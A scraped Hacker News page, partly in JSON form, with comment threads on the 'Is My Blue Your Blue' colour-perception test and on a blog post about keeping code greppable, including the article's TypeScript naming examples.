terms of what I see, I can only assume I'm seeing the same thing as everybody else is because the test is not testing it. Just because I call something green doesn't mean I don't see all the blue in it. >Edit: Possible improvements: changing the wording to \"this is MORE green\" and \"this is MORE blue\" and randomizing the order in which they are shown, somehow. I realize you're just doing some kind of binary search, narrowing the color range. yes, the test should show you pure blue, then a turquoise mix, then pure green, and a ... etc. It should also retest you on things you already answered to measure where you are consistent. reply yarg 16 hours agorootparentI do think that the philosophical question could potentially be approachable in a modern context; Show people a colour and map their brain activity - the level of similarity between two people's colour perceptions should be reflected by similarities in the activity. reply pminimax 15 hours agorootparentPeople have done this. See, e.g. Brouwer and Heeger (2009), Decoding and Reconstructing Color from Responses in Human Visual Cortex. reply yarg 15 hours agorootparentThanks. https://www.jneurosci.org/content/jneuro/29/44/13992.full.pd... reply lazide 16 hours agorootparentprevWhy do you think that would be the case? One persons ‘blue’ activity could be different than another’s while still being the same wavelength of light and general perception. reply yarg 16 hours agorootparentThe philosophical question is not dealing with the objective external reality; It's a question of subjective experience - and that experience should be reflected in electrical activity. Given the fact that the broad structure of the brain is largely shared across members of the species, similar stimulation should trigger similar activity in the same regions of the brain. If the same colour triggers markedly different activities, it would not be unreasonable to conclude that the subjective experiences are not the same. reply amenhotep 7 hours agorootparentIt sounds like you're in possession of a solution to the hard problem of consciousness, you should alert your nearest philosophy department. reply lazide 16 hours agorootparentprevExcept that’s literally not how humans are wired or develop - even nerve paths and other fine grained details in our bodies show significant divergence, and there are major macro level differences readily apparent even based on gender, color blindness, etc. Honestly, it would be shocking if it were even a little true beyond ‘frontal cortex’ levels of granularity. And even then, Phineas Gage type situations make it clear that may not actually be required either. And that means completely different individual activity can trigger similar subjective experiences as much as similar activity can trigger different subjective experiences, no? reply yarg 16 hours agorootparentIf that were the case then there's no way that they'd be able to extract images from people's neural activity, and yet they've started doing that very thing. reply lazide 16 hours agorootparentOccasionally, after training on specific individuals, for those specific individuals. reply yread 11 hours agoparentprevAgreed. It would be more accurate to show the final gradient (without the curve) and let people choose where is the boundary. It wasn't even clear what the actual task is reply larschdk 9 hours agoparentprevI am unable to answer many of them. I see mostly turquoise, not blue or green. reply adamhartenz 16 hours agoparentprevYup, but at that level, you are not affecting the results very much. So it all works out reply terryf 13 hours agoparentprev> and you're unlikely to keep hitting \"this is green\" several times in a row I did. Because it was green! reply arendtio 10 hours agoparentprevYeah, it felt like a trick question to me. Because the second color I saw was somewhat like turquoise and the site is called 'Is My Blue Your Blue,' I decided that everything that you say yes to colors would be blue and everything else would be green. I never saw a green until the result was displayed :D reply jsharpe 16 hours agoparentprevExactly my thoughts! Thanks for putting it so clearly. reply pminimax 2 hours agoprevAuthor here. I added fields so you can specify your first language (relevant link: https://en.wikipedia.org/wiki/Blue%E2%80%93green_distinction...) and colorblindness. FAQ: * I can't know your monitor's calibration, your ambient light, or your phone's brightness. Obviously, this will affect the results. However, I am tracking local time of day and device type, from which we should be able to infer whether night mode and default calibration has any aggregate effects. Anecdotally, thus far, I haven't found any effects of Android vs. iPhone (N=34,000). * The order is randomized. Where you start from can influence the outcome, but methodologically it's better to randomize so the aggregate results average over starting point. You can run the test several times to see how reliable this is for you. * It's common practice in psychophysics to use two alternatives rather than three (e.g. blue, green, something in the middle). It would be a fun extension, which you can handle with an ordered logistic regression. The code is open if you want to take a shot at it: https://github.com/patrickmineault/ismyblue * I will release aggregate results on my blog, https://neuroai.science * I am aware of most of the limitations of this test. I have run psychophysics experiments in a lab on calibrated CRTs during my PhD in visual neuroscience. *This is just entertainment*. I did this project to see if I could make a fun webapp in Vue.js using Claude Sonnet, and later cursor, given that I am not highly proficient in modern webdev. A secondary point was to engage people in vision science and get them to talk and think about perception and language. I think it worked! reply scottdupoy 1 hour agoparentMy partner and I regularly disagree on blue vs green as the colours become more of a gray colour - might be interesting to randomise the brightness of the colours being displayed then seeing if the skew towards people perceiving blue Vs green changes as the colours become closer to gray. reply KajMagnus 1 hour agoparentprevIt was fun but I messed up the statistics! I had Redshift running, which (maybe you know) makes the colors more reddish. And I got a bluer than 98% of the population result. Turning off Redshift ... makes me instead greener than bluer. reply pminimax 1 hour agorootparentI wouldn't worry about one datapoint out of 35,000 messing up the stats. reply KajMagnus 1 hour agorootparentThat's a lot! Now I noticed: \"I am tracking local time of day[...] infer whether night mode [...] any aggregate effects.\" So you've thought about that already :- ) (it's evening here) reply kome 2 hours agoparentprevsome of your blue are actually azure to me reply jade-cat 4 hours agoprevI've taken the test multiple times, and ended up with my boundary being both greener than >70% of the population and bluer than >70% of the population in separate attempts. And I know my color perception to be good at distinguishing hue - it's just that I don't have strong opinions about categorizing it in this space. I'm pretty sure there's some hysteresis going on - if we randomly end up in the ambiguous zone on the bluer side, we'll be pressing \"blue\" every time a small change happens, because it's basically the same color. Until the changes add up so much that we're out of the ambiguous zone on the green side - and now our \"border\" is far on the green side. But if we started on the other side, entering the ambiguous zone from the green side, it'd take a big cumulative change before we press \"blue\". reply kazinator 15 hours agoprevI stopped at the first one I could not call blue or green. If I were to call it blue or green, it would not only not be reflecting what I think, but I could not guarantee that if I'm show the exact same color again, that I will go the same way. So I felt there was no point in continuing. This is a problem in the method; there needs to be a third choice, so that the user can always answer (at least if the test color is always in the blue-green gamut). It could work with two choices if the user were instructed to randomly choose in the event of indecision. I mean, truly randomly, like by means of a fair coin toss. But that could just be implemented for them by a third button. That button could then just record their indecision rather than randomly choose between blue and green, so you have better data. Without a third choice, or properly randomized behavior, you have bias problems. For instance, a certain user who likes the blue color might always say blue when not able to decide. Another one might always go for green. Yet, those two users might exactly coincide in what they unmistakably call blue, green and what triggers hesitation/indecision. (I realize that no matter how many bins we have, there are boundary indecisions, like not being able to decide between green and blue-green. What range constitutes indecision is also subjective.) reply rotidder 6 hours agoparentThat exactly is the point of the test though. Not to test whether most people call 100% blue blue, or 100% green green. It is to test at which point of the \"inbetween\" colors people switch from blue to green or vice versa. It forces you to decide whether the color you see is \"more blue\" or \"more green\", since after all they're all just a mix of blue and green. reply kazinator 1 hour agorootparentYou can estimate that if you can determine at which point the color becomes too ambiguous to call blue on one side, or green on the other. Different people will have a different range. If you want to identify a threshold, you can take the midpoint of the range. Also see: https://en.wikipedia.org/wiki/Two-alternative_forced_choice This page explains why the approach in \"Is My Blue Your Blue\" is susceptible to response biases. It presents a single stimulus and asks a classification question. The right approach is to present two stimuli and ask which one. In this case, we should split the screen and show two colors in two panes, and ask which one is more blue. reply Timwi 5 hours agorootparentprevWell for me, personally, blue and green are simply not adjacent, so there's no point where green turns to blue without going through an intermediate color. This might well be due to my extreme exposure to computer colors, where the in-between color is usually called cyan, or sometimes teal or aqua. When I see cyan, I cannot sincerely say that it looks “more blue” or “more green” to me, any more than an orange tastes “more apple” or “more banana”. reply ertgbnm 4 hours agorootparentLight can absolutely be more blue or more green in an objective sense. Either it is closer to blue on the spectrum or it's closer to green. It doesn't matter if you have intermediate categories in between. To poke a whole in your analogy, a more apt comparison would be to a gradient of sweetness, where one can indeed describe a flavor as \"more sweet\" or \"less sweet\" relative to apples and bananas. reply Narishma 5 hours agorootparentprevIn my case, and it seems OP's as well, it forced me to stop the test instead of picking one of the two. reply phito 13 hours agoparentprevTotally agree, I stopped at the second one because it was neither green nor blue reply marcus_holmes 15 hours agoprevI'm red/green colourblind, so this was interesting to compare my green against my blue. The thing I find being colourblind is that I value colour less than shade. Colour signals, even when I can tell them apart, are just less important to me than to non-colourblind people. I most recently noticed this playing Valheim with my wife. There are red mushrooms in the game, surrounded by green foliage. I noticed that I have trouble spotting them, even though I have no problem seeing that they are red and the foliage is green. To her, the mushrooms stand out as being very visually different from the background and immediately noticeable. To me, they just aren't that distinct and get quite hard to spot. So while I got the green/blue distinction to within 80% of the population, despite my shitty colour perception, it just didn't matter. At some point in the process I got to \"I really don't care. I would ignore the signal that any further difference in colour is sending\". As you can guess, I have fascinating talks with designers and artists, to whom the differences really matter. I understand that colour is really important to them. I just don't see it. reply mihaaly 10 hours agoparentI am also red/green colorblind and so I cannot tell if graphs using colours in many articles (more than not) is so shitty for everyone else or not, but choosing no distinct colours (that I have no trouble differentiating) on thin lines is defying the purpose (understanding) I believe. Even if I had no trouble with colours (being close to darker shades of brown) I would perhaps use thicker lines and variate the style of the lines. So the information screams out. Putting similar shade colours on graph with colour legend in the corner telling which thin line means what is just something I throw away mentally being so difficult to navigate. reply karaterobot 3 hours agorootparentI've got normal color vision, and it's bad for me too. If there's more than about a half dozen lines on a graph, chances are two of them are going to be so close together that it's a pain to figure out which is which. Visually distinguishing information in graphs can be a very tricky problem, but at the same time, people could easily do a much better job at it if they tried. reply thisOtterBeGood 14 hours agoparentprevInteresting. Red next to green creates a different kind of contrast. It looks like its glowing (vibrant border), the same way our eyes perceive something very close compared to something far away. That is just my observation, I'm not sure If there is some scientific evidence for that. reply lll-o-lll 14 hours agoparentprevI have normal color vision, and color just doesn’t matter to me (I can never remember the colors of things, and distinction by color doesn’t help me much). I’m not discounting your theory, but I think there must be a little more to it. reply AlotOfReading 13 hours agorootparentNot the person you're responding to, but also colorblind and I strongly relate to what they're expressing. It's different than not being able to remember colors. I can see (most) differences, but I need to actively focus on seeing to do it. For example, one CI system uses red/green stoplight emojis for test status. A given run might have 50-100 of them. Trying to see which ones are red means actively looking at each individual status and thinking \"what color is that?\" because my brain simply doesn't register reds as \"jumping out\" in the sea of green. reply Suppafly 3 hours agorootparent>For example, one CI system uses red/green stoplight emojis for test status. A given run might have 50-100 of them. Trying to see which ones are red means actively looking at each individual status and thinking \"what color is that?\" because my brain simply doesn't register reds as \"jumping out\" in the sea of green. Fellow CVD person here, I have that same problem at work. That and when there are up/down arrows and whether up or down is good changes based on the metric and they use color to let you know. They all look samey unless I actually stare at them for a while and the color difference sorta bubbles up. It's so annoying too because it'd be trivial to use different signals instead of color, but no one cares about the 1/12 of us that are colorblind. It's crazy that the ADA doesn't recognize CVD as needing accommodation when it's far more common than most other disabilities. reply marcus_holmes 13 hours agorootparentprevYes! I've had some lengthy discussions with UI designers trying to get them to understand this exact point. I can see that they're red and green, I just don't notice that they're red and green. reply jiehong 11 hours agorootparentReminds them that colors and shapes must be different in a UI. They’re supposed to learn that super early in their career. reply nicolas_t 12 hours agorootparentprevInteresting, does playing a lot of games with a toddler asking them to distinguish between colors reduces the chance that they have your type of colourblindness? Since you can see the individual colors but need to concentrate on them, I wonder if playing such games make the child learn to notice the colors? reply dentemple 42 minutes agorootparentLike the other person said, most forms of colorblindness is caused by genetics--specifically, recessive traits. So, it's the sort of trait that will run in the family. To help explain our experience, it's like trying to distinguish between two similar shades of yellow. It'll be clear and obvious that both are the color yellow. When there's only one example of each standing next to each other, it'll be easy to tell which shade is the lighter one, even if it's only slightly different. But if you had a sea of examples and are asked to pick out which yellows are slightly lighter than the other ones, then it might cause you to stop and study them for awhile to figure it out. It's just like that for the common forms of colorblindness (where the color cones in the eyes are bent, but not missing), but instead of this metaphorical \"yellow\" it's this special \"red-and-green\" color that we see that's different from what everyone else sees. It's like trying to distinguish between two different shades of the same color, where it's obvious which is which when there's only two examples to compare to but not so much when your entire field of vision has bits of one hidden amongst a sea of the other. It's like red and green are a spectrum of the same color rather than being two separate ones. reply marcus_holmes 11 hours agorootparentprevMine is genetic, inherited from my maternal grandfather. My mother was an artist, spent ages testing my colour range with a set of Pantone colour swatches, just out of curiosity rather than as an attempt to cure it. That's how I know I see shade better than colour - she would show me two swatches that differed slightly in colour and then two that differed only in shade (or shade/tone/tint to be accurate). I could tell the shade differences apart better than the colour differences. So I'm not sure that early training would help. But it couldn't hurt reply Finnucane 4 hours agoparentprevI got 174 ('true neutral') by choosing 'blue' or 'not blue'. The 'green' here looks to me like a light yellowy-orange. The color that I have learned to associate with unripe bananas. reply michaelteter 5 hours agoprevThis is a classic problem of trying to choose a single label for anything. There are very few absolutes… maybe none. I like this test applied to an apple. . With no bites taken, is it an apple? (Of course) Now take a bite. Still an apple? (Most would say yes). Keep taking bites until it is just a core, or an even just a seed. Then? Maybe my favorite is just the boundary of one of us humans. Where is the boundary between me and not me? Obviously it’s on the outer edge of my skin. But zoom in a lot, and you have this blue/green binary fit problem. reply Gormo 2 hours agoparentFundamentally, reality is a continuum of variation, and the categories and ontologies we define are just models that are useful for reconcile reality to our own cognitive capacities, rather than anything objectively true of the external world. reply joegibbs 17 hours agoprevI got \"Your boundary is at hue 167, greener than 86% of the population. For you, turquoise is blue\". I think I consider darker and yellower colours as green - for instance tennis balls are firmly green to me, but a lot of people say they're yellow. I wonder if this has anything to do with your upbringing. I grew up on a farm in a dry part of Australia, where the grass didn't often get very green. Most of the year it was yellow. If you associate green with grass and the grass is yellow, maybe you associate green with a yellower colour? reply Jeremy1026 16 hours agoparentIt's very cultural. For example, Japan used the same word for green and blue, so their green light on traffic lights is as blue as possible while conforming to international standards for the light to be \"green\". Also, there is a pretty well done video by Vox on how color names are influenced by culture https://www.youtube.com/watch?v=gMqZR3pqMjg reply numpad0 13 hours agorootparentI think this might be a bit overblown. \"why do we call it blue signal?\" is a common 3-5 years old question in Japan. Old Japanese traffic signals had blue tinted lenses, like ultramarine blue. Those lenses were used in conjunction with warm yellow incandescent lamps, technology available at the time. Deep blue + warm yellow = green. Over time the green color must have normalized, without laws and slogans not reflecting that. And nowadays they're green LEDs. reply dhosek 16 hours agorootparentprevThe blue-green distinction is something that tends to come late in most or maybe all language families. Ancient Greek also used the same word for blue and green. As I recall, the first color words a language gains are black and white, followed by red. Blue-green is one of the last distinctions made. reply petercooper 6 hours agorootparentprevThis has begun to happen in the UK as well, and I'm struggling to get anyone else to see it. Traffic lights installed in the past couple of years seem to use a new style of LED that emits a turquoise light instead of green. I took a picture and looked at the RGB value and the G/B were equal. Everyone else I ask says they still look green. Here's an example: https://static.independent.co.uk/2022/04/22/00/21135757-1ac1... reply arrowsmith 9 hours agorootparentprevNot just Japanese - many languages use the same word for \"green\" and \"blue\". Linguists call it \"grue\". https://en.wikipedia.org/wiki/Blue%E2%80%93green_distinction... E.g. the Vietnamese word xanh means \"grue\", and to distinguish between green and blue you say \"sky xanh\" or \"leaf xany\". reply WesolyKubeczek 16 hours agorootparentprevThank gods at least red is red. In all rulebooks, lights are red-yellow-green, but in many places, I can see red-amber-turquoise. Now a sure way to get a traffic police officer livid is to call the yellow light “amber” or “orange”… reply pests 16 hours agorootparentMy friend got a \"Running an Amber\" ticket when we were teens outside metro Detroit, MI. I had never heard it called that color before but that small memory is always on my mind when the light changes as I'm crossing. reply petercooper 6 hours agorootparentIn the UK, the yellow light is officially an \"amber\" light in terms of driver regulations and statutes, such that some anally retentive type is always bound to correct anyone who dares say \"yellow\". reply azepoi 16 hours agorootparentprevIt's orange in french reply tzot 7 hours agorootparentIn Greek too. reply epiccoleman 16 hours agoparentprevI got a very high \"green\" threshold too - 95% averaged across three runs, since my first result seemed surprisingly high. It's funny though - I feel like I'm less likely to go green on the other direction too. I'd probably say a tennis ball is right on the line, and seems more yellow than green to me too. Maybe I'm some sort of green gatekeeper, and I don't want to dilute my personal definition with lesser greens. Green is my favorite color, I'd say, so maybe that's something to do with it. reply azepoi 16 hours agoparentprevIt can be cultural. Turquoise is often called bleu turquoise in french. So it's more of a blue to me. reply seszett 11 hours agorootparentYes, and I'd like to see a breakdown of the answers per country. I'm French and my boundary is at 167 apparently (though I have a poor screen and depending on where I look, I could say that even further towards the green side is still blue). But a regular occurrence at home is my wife (who speaks a different language, we don't live in France) talking about « the green table » while I'm trying hard to find any green table around us, until I realize she's talking about that turquoise table that I call the blue table. Also happens on the red/pink and pink/purple boundaries. reply warpech 10 hours agorootparentAgree. If the author collects the IP address of the response, maybe countries can be mapped retrospectively. reply e40 16 hours agoparentprevGot “Your boundary is at hue 175, bluer than 65% of the population” reply dabber21 1 hour agorootparentgot the exact same reply Sateeshm 14 hours agoparentprevMy boundary was at 89% reply theawesomekhan 6 hours agoprevSurprisingly in some languages such as in my mother tongue \"Pastho\" : we have the same one single word for Blue and Green. let's call it blue. So we say \"Blue like the sky? or blue like the grass\" reply maxwell 4 hours agoparentWhile Russian not only separates blue and green, but also light and dark blue. https://www.thoughtco.com/russian-colors-4776553 And English includes indigo in the ROYGBIV rainbow because of Newton's numerology. https://nationalpost.com/news/why-the-colour-indigo-is-disap... reply rexpop 2 hours agorootparent> Someone forgot to check a physics textbook before sewing a flag, which isn’t exactly a shocker. Why does the author find it necessary to mock \"scientific accuracy at Gay Pride parades\"? Especially when the point of the article is that 7 is no more \"scientifically accurate\" than the gay 6? I think it's in very poor taste to suggest that to be gay is to be scientifically inaccurate. reply Suppafly 3 hours agoparentprev>Surprisingly in some languages such as in my mother tongue \"Pastho\" : we have the same one single word for Blue and Green. let's call it blue. The history of language is like that, early on a population would have one word for both and then eventually distinguish a line between blue and green and then later start getting more specific shades from there. reply JoblessWonder 1 hour agoprevI used to have a lot of anxiety wondering if what my brain perceived as \"Blue\" was the same shade of \"Blue\" to other people. Like, sure, the sky is blue and a similar color to water for everyone.... but what if what I see as blue is actually red for other people and there is just no way to confirm because that is how our brain processes that frequency of light? I'm sure it isn't actually possible to confirm... but I was always interested in it. Late addition to comment: I just found this article that explains it well and has some theories on it: https://www.livescience.com/21275-color-red-blue-scientists.... reply kolbe 55 minutes agoparentUltimately it doesn't matter. Your \"blue\" is just a translation of that frequency to some distinguishable impression to allow you to see. But it's a good bet that the same wiring that went into your brain making that translation also went into other brains. reply dariosalvi78 38 minutes agoprevThere's an issue of language here. For me, an Italian, blue is dark and \"azzurro\" is light. I played the game assuming that \"azzurro\"=Blue but I guess that sensitivity is skewed by semantics here. You can try to capture mother language too and see how it affects the statistics reply rswerve 2 hours agoprevThe About pages notes that this was built with Claude Sonnet 3.5. Nice to see these real-world LLM uses where people who aren't front-end developers can share cool things. reply hettygreen 17 hours agoprevAm I missing something? The ambiguous ones are neither blue nor green, they're just cyan. reply rhplus 16 hours agoparentI think the whole point is that the blue/green distinction is very subjective and may be culturally influenced for certain populations: https://en.wikipedia.org/wiki/Blue%E2%80%93green_distinction... The example we see every day in traffic lights. In most parts of the world we’d unambiguously call it a “green” light, despite the fact they’re almost always cyan, with the blue component (apparently) helping drivers with red/green color-blindness. https://engineering.stackexchange.com/questions/53255/what-c... reply declan_roberts 16 hours agoparentprevThat's the fun part, where do you draw the line in comparison to other people? reply TechRemarker 16 hours agoparentprevYes, that's the point of the test, to see how you perceive the ambiguous ones. That is, at the end it shows the chart with the left 50% is green and right 50% is blue. The turquoise in the middle is what is hard to tell if green (aka on the left 50% or blue aka on the right 50%). For many the result line isn't down the middle but more to the left or right, and thus shows if you see turquoise (the ambiguous colors) more as blue or green. The text at the bottom of the test should put the answer in words/numbers. reply the__alchemist 16 hours agorootparentIt sounds like he or she perceived the color in question as cyan, which isn't an option. reply TechRemarker 16 hours agorootparentSince cyan means 50% green and 50% blue, other than exactly in the middle of the chart, all the colors shown are either to the left of cyan(the middle), or to the right. So all the colors are either slightly to a lot blue or slightly to a lot green. This test is testing where everyone middle essentially is. If there were as cyan/turqouise option, that would be a very different test, I imagine essentially testing to lines, where the line between blue and cyan/ambiguity begins and the line between green and cyan/ambiguity begins requiring I imagine several more questions to get that answer and would only then be showing two lines on the graph, vs this test which is able to say if you lean more to the right or left of the middle of blue to green. reply kstrauser 16 hours agoparentprevIf you had to say that cyan was more blue or green, which would you pick? reply TechRemarker 16 hours agorootparentSorry do you mean in general, if I went to a paint store and they showed me a cyan patch? It would depend on that particular shade of cyan if it was more green or blue, and then on top of that my eyes bias towards green/blue. Or are you asking for the results of my own test here which show my particular bias of turquoise (as the author refers to or cyan as you refer to)? Took the test a couple types and varies but for me say I see turquoise as green (though close to 50%, so if took a few more times imagine may land blue sometimes and/or depend on if I'm viewing in a dark room or light room. reply kaashif 12 hours agorootparentprevIf I had to say zero is more positive or negative, I'd probably say positive. But in reality it's neither. reply hypertele-Xii 7 hours agorootparentprevCyan is literally an even mix of blue and green. reply postalrat 25 minutes agorootparentSo if there is only one cyan then then it should be easy to label something as green or blue. reply qiqitori 16 hours agorootparentprevI'd pick... u wot m8. reply TechRemarker 16 hours agorootparentSorry not sure I understand. Yes, with each color that appears the I (or any user) has to pick which color they see more of, blue or green. Since every color shown unless presumably exactly 50% between green and blue, will either be more blue or more green. So you/I/users have to pick if they see more green or blue. The person next to you might see a hint of blue and you may see a hint of green for the same color since our eyes all work differently. UPDATE-Oh you may have been asking that of the person I was replying to initially. reply p1necone 15 hours agoparentprevCyan is just another shade of blue to me. The colour you get when you google image search \"cyan\" is definitely more blue than green to my eyes. reply kaetemi 14 hours agorootparentThat's partially a cultural effect of many peers calling cyan blue. Same as chartreuse and turquoise just getting called a weird shade of green, names affect perception. Worse, if you call cyan blue, turquoise may become a weird shade of blue too, even though it's not even close. reply hypertele-Xii 7 hours agorootparentprevOpen up any digital drawing program. Adjust the color. Max out green and blue. That's cyan. Equal parts both. reply 183 more comments... GuidelinesFAQListsAPISecurityLegalApply to YCContact Search:",
    "originSummary": [],
    "commentSummary": [
      "The \"Is My Blue Your Blue?\" test explores how individuals classify the color cyan, revealing subjective differences in color perception.",
      "Factors such as monitor calibration, ambient lighting, and personal perception significantly influence the test's accuracy.",
      "The test, created by a visual neuroscience expert, aims to entertain and provoke thought about the interplay between perception and language."
    ],
    "points": 1048,
    "commentCount": 435,
    "retryCount": 0,
    "time": 1725326244
  },
  {
    "id": 41430772,
    "title": "Greppability is an underrated code metric",
    "originLink": "https://morizbuesing.com/blog/greppability-code-metric/",
    "originBody": "Aug 29, 2024 Greppability is an underrated code metric Photo by Scott blake on Unsplash When I’m working on maintaining an unfamiliar codebase, I will spend a lot of time grepping the code base for strings. Even in projects exclusively written by myself, I have to search a lot: function names, error messages, class names, that kind of thing. If I can’t find what I’m looking for, it’ll be frustrating in the best case, or in the worst case lead to dangerous situations where I’ll assume a thing is not needed anymore, since I can’t find any references to it in the code base. From these situations, I’ve derived some rules you can apply to keep your code base greppable: Don’t split up identifiers It turns out that splitting up, or dynamically constructing identifiers is a bad idea. Suppose you have two database tables shipping_addresses, billing_addresses, it might seem like a perfectly good solution to construct the table name dynamically from the order type. const getTableName = (addressType: 'shipping''billing') => { return `${addressType}_addresses` } Though it looks nice and DRY, it’s not great for maintainenance: someone will inevitably search the code base for the table name shipping_addresses and miss this occurence. Refactored for greppability: const getTableName = (addressType: 'shipping''billing') => { if (addressType === 'shipping') { return 'shipping_addresses' } if (addressType === 'billing') { return 'billing_addresses' } throw new TypeError('addressType must be billing or shipping') } The same goes for column names, object fields, and, god forbid, method/function names (it’s easily possible to dynamically construct method names with javascript). Use the same names for things across the stack Don’t rename fields at application boundaries to match naming schemes. An obvious example is then importing postgres-style snake_case identifiers into javascript, then converting them to camelCase. This makes it harder to find—you now have to grep for two strings instead of one in order to find all occurences! const getAddress = async (id: string) => { const address = await getAddressById(id) return { streetName: address.street_name, zipCode: address.zip_code, } } You’re better off biting the bullet and returning the object directly: const getAddress = async (id: string) => { return await getAddressById(id) } Flat is better than nested Taking inspiration from the Zen of Python, when dealing with namespaces, flattening your folders/object structures is mostly better than nesting. For example if you have two choices to set up your translation files: { \"auth\": { \"login\": { \"title\": \"Login\", \"emailLabel\": \"Email\", \"passwordLabel\": \"Password\", }, \"register\": \"title\": \"Register\", \"emailLabel\": \"Email\", \"passwordLabel\": \"Password\", } } } and { \"auth.login.title\": \"Login\", \"auth.login.emailLabel\": \"Email\", \"auth.login.passwordLabel\": \"Password\", \"auth.register.title\": \"Login\", \"auth.register.emailLabel\": \"Email\", \"auth.register.passwordLabel\": \"Password\", } take the second option! You will be able to easily find your keys now, which you are probably referring to as something like t('auth.login.title'). Or consider React component structure: a component stucture like ./components/AttributeFilterCombobox.tsx ./components/AttributeFilterDialog.tsx ./components/AttributeFilterRating.tsx ./components/AttributeFilterSelect.tsx is preferable to ./components/attribute/filter/Combobox.tsx ./components/attribute/filter/Dialog.tsx ./components/attribute/filter/Rating.tsx ./components/attribute/filter/Select.tsx from a greppability perspective, since you’ll be able to grep for the whole namespaced component AttributeFilterCombobox just from the usage, as opposed to just Dialog, which you might have multiple of accross your application. No AI tooling was used in the creation of this article. More articles: Initializing a Yjs document with a common value Using vercel’s swr with next.js server side rendering Prevent an effect from firing at mount Want to read more like this? Email Subscribe",
    "commentLink": "https://news.ycombinator.com/item?id=41430772",
    "commentBody": "Greppability is an underrated code metric (morizbuesing.com)907 points by thunderbong 16 hours agohidepastfavorite479 comments dang 11 minutes agoYes, and 'greppable' is an underused word/concept in its own right. I've used this as an organizing principle since forever (https://news.ycombinator.com/item?id=1535916). It's one of the best ways to factor code that I know of. reply skrebbel 9 hours agoprevThe second point here made me realize that it'd be super useful for a grep tool to have a \"super case insensitive\" mode which expands a search for, say, \"FooBar|first_name\" to something like /foo[-_]?bar|first[-_]?name/i, so that any camel/snake/pascal/kebab/etc case will match. In fact, I struggle to come up with situations where that wouldn't be a great default. reply msmolkin 32 minutes agoparentHey, I just created a new tool called Super Grep that does exactly what you described. I implemented a format-agnostic search that can match patterns across various naming conventions like camelCase, snake_case, PascalCase, kebab-case. If needed, I'll integrate in space-separated words. I've just published the tool to PyPI, so you can easily install it using pip (`pip install super-grep`), and then you just run it from the command line with `super-grep`. You can let me know if you think there's a smarter name for it. Source: https://www.github.com/msmolkin/super-grep reply dang 12 minutes agorootparentYou should post this as a Show HN! But maybe wait a while (like a couple weeks or something) for the current thread to get flushed out of the hivemind cache. If you do, email a link to hn@ycombinator.com and we'll put it in the second-chance pool (https://news.ycombinator.com/pool, explained at https://news.ycombinator.com/item?id=26998308), so it will get a random placement on HN's front page. reply Groxx 54 minutes agoparentprevfwiw I pretty frequently use `first.?name` - the odds of it matching something like \"FirstSname\" are low enough that it's not an issue, and it finds all cases and all common separators in one shot. reply hnben 7 hours agoparentprev> \"super case insensitive\" lets say someone would make a plugin for their favorite IDE for this kind of search. How would the details look like? To keep it simple, lets assume we just do the super-case-insensitivity, without the other regex condition. Lets say the user searches for \"first_name\" and wants to find \"FirstName\". one simple solution would be to have a convention where a word starts or ends, e.g. with \" \". So the user would enter \"first name\" into the plugin's search field. The plugin turns it into \"/first[-_]?name/i\" and gives this regexp to the normal search of the IDE. another simple solution would be to ignore all word boundaries. So when the user enters \"first name\", the regexp would become \"/f[-_]?i[-_]?r[-_]?s[-_]?t[-_]?n[-_]?a[-_]?m[-_]?e[-_]?/i\". Then the search would not only be super-case-insensitive, but super-duper-case-insensitive. I guess the biggest downside would be, that this could get very slow. I think implementing a plugin like this would be trivial for most IDEs, that support plugins. Am I missing something? reply skrebbel 5 hours agorootparentHm I'd go even simpler than that. Notably, I'd not do this: > So the user would enter \"first name\" into the plugin's search field. Why wouldn't the user just enter \"first_name\" or \"firstName\" or something like that? I'm thinking about situations like, you're looking at backend code that's snake_cased, but you also want it to catch frontend code that's camelCased. So when you search for \"first_name\" you automagically also match \"firstName\" (and \"FirstName\" and \"first-name\" and so on). I wouldn't personally introduce some convention that adds spaces into the mix, I'd simply convert anything that looks snake/kebab/pascal/camel-cased into a regex that matches all 4 forms. Could even be as stupid as converting \"first_name\" or \"firstName\", or \"FirstName\" etc into \"first_name|firstname|first-name\", no character classes needed. That catches pretty much every naming convention right? (assuming it's searched for with case insensitivity) reply kiitos 11 minutes agorootparentprevIt would be a mistake to try to solve this problem with regexes. reply __MatrixMan__ 6 hours agorootparentprevShame on me for jumping past the simple solutions, but... If you're going that far, and you're in a context which probably has a parser for the underlying language ready at hand, you might as well just convert all tokens to a common format and do the same with the queries. So searches for foo-bar find strings like FooBar because they both normalize to foo_bar. Then you can index by more than just line number. For instance you might find \"foo\" and \"bar\" even when \"foo = 6\" shows up in a file called \"bar.py\" or when they show up on separate lines but still in the same function. reply inanutshellus 6 hours agorootparentprevIIUC, you're not missing anything though your interpretation is off from mine*. He wasn't saying it'd be hard, he was saying it should be done. * my understanding was simply that the regex would (A) recognize `[a-z][A-Z]` and inject optional _'s and s between... and (B) notice mid-word hyphens or underscores and switch them to search for both. reply marcosdumay 4 hours agorootparentprevThe best way would be to make an escape code that matches zero or one punctuation. So you's search for \"/first\\_name/i\". reply Izkata 1 hour agorootparentThat already exists as \"?\" and was used in their example: /first[-_]?name/i Or to use your example, just checking for underscores and not also dashes: /first_?name/i Backslash is already used to change special characters like \"?\" from these meanings into just \"use this character without interpreting it\" (or the reverse, in some dialects). reply WizardClickBoy 8 hours agoparentprevThis reminds me of the substitution mode of Tim Pope's amazing vim plugin [abolish](https://github.com/tpope/vim-abolish?tab=readme-ov-file#subs...) Basically in vim to substitute text you'd usually do something with :substitute (or :s), like: :%s/textToSubstitute/replacementText/g ...and have to add a pattern for each differently-cased version of the text. With the :Subvert command (or :S) you can do all three at once, while maintaining the casing for each replacement. So this: textToSubstitute TextToSubstitute texttosubstitute :%S/textToSubstitute/replacementText/g ...results in: replacementText ReplacementText replacementtext reply WizardClickBoy 6 hours agorootparentAlso just realised while looking at the docs it works for search as well as replacement, with: :S/textToFind matching all of textToFind TextToFind texttofind TEXTTOFIND But not TeXttOfFiND. Golly! reply User23 6 hours agorootparentprevThe Emacs replace command[1] defaults to preserving UPCASE, Capitalized, and lowercase too. [1] https://www.gnu.org/software/emacs/manual/html_node/emacs/Re... reply tambourine_man 6 hours agorootparentOf course it does. Or it wouldn’t be Emacs reply boxed 6 hours agoparentprevI think Nim has this? reply archargelod 3 hours agorootparentNim comes bundled with a `nimgrep` tool [0], that is essentially grep on steroids. It has `-y` flag for style insensitive matching, so \"fooBar\", \"foo_bar\" and even \"Foo__Ba_R\" can be matched with a simple \"foobar\" pattern. The other killer feature of nimgrep is that instead of regex, you can use PEG grammar [1] [0] - https://nim-lang.github.io/Nim/nimgrep.html [1] - https://nim-lang.org/docs/pegs.html reply dominicrose 6 hours agoparentprevLet's say you have a FilterModal 